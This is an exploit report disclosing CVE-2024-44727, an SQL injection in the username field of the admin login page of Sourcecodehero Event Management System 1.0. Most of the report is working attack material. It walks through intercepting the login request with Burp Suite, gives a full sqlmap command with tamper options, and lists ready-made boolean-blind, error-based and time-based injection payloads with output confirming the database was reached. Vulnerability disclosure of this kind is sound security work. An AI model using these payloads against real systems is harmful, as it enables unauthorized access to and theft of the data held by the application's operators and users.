# Exploit Report: Sourcecodehero Event Management System 1.0 SQL Injection

- **Exploit Title:** Sourcecodehero Event Management System 1.0 SQL Injection  
- **Date:** 13-08-2024  
- **Exploit Author:** Aslam Anwar Mahimkar  
- **Vendor Homepage:** [sourcecodehero.com](https://sourcecodehero.com/)  
- **Software Link:** [Event Management System Project](https://sourcecodehero.com/event-management-system-project-in-php-and-mysql-with-source-code/)  
- **Version:** 1.0  
- **Tested On:** Kali Linux  
- **CVE:** CVE-2024-44727

## Description:

Sourcecodehero Event Management System 1.0 allows SQL Injection via parameter 'username' in "/event/admin/login.php". Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latest vulnerabilities in the underlying database.

## Proof of Concept

1. **Access the Admin Panel**
   - Navigate to the admin login page: [http://localhost/event/admin/login.php/](http://localhost/event/admin/login.php/)

2. **Log In with Random Data**
   - Enter random data in the `username` and `password` fields.
   - Click the 'Login' button.

3. **Intercept the Request**
   - Use Burp Suite to intercept the login request.
   - Send the intercepted request to Burp Suite's Repeater tool.

4. **Save the Request**
   - Copy and paste the intercepted request into a file named `request.txt`.

5. **Exploit with sqlmap**
   - Use `sqlmap` to exploit the SQL Injection vulnerability.
   - Specifically, use the `username` parameter to dump the database.

STATUS: HIGH Vulnerability CRITICAL

[+]Payload:

```PHP
sqlmap -r request.txt -p username --risk 3 --level 5 --threads 1 --random-agent tamper=between, randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db 

```

[+]Responce:


```PHP
---
Parameter: username (POST)
	Type: boolean-based blind
	Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
	Payload: username=test' OR NOT 6811=6811#&password=atatata

	Type: error-based
	Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
	Payload: username=test' AND (SELECT 2832 FROM(SELECT COUNT(*),CONCAT(0x71786a7171,(SELECT (ELT(2832=2832,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- RbId&password=atatata

	Type: time-based blind
	Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
	Payload: username=test' AND (SELECT 4457 FROM (SELECT(SLEEP(5)))idzY)-- vjKg&password=atatata
---
[02:04:43] [INFO] testing MySQL
[02:04:43] [INFO] confirming MySQL
[02:04:44] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[02:04:44] [INFO] fetching current database
[02:04:44] [INFO] retrieved: 'eventdb'
current database: 'eventdb'

```

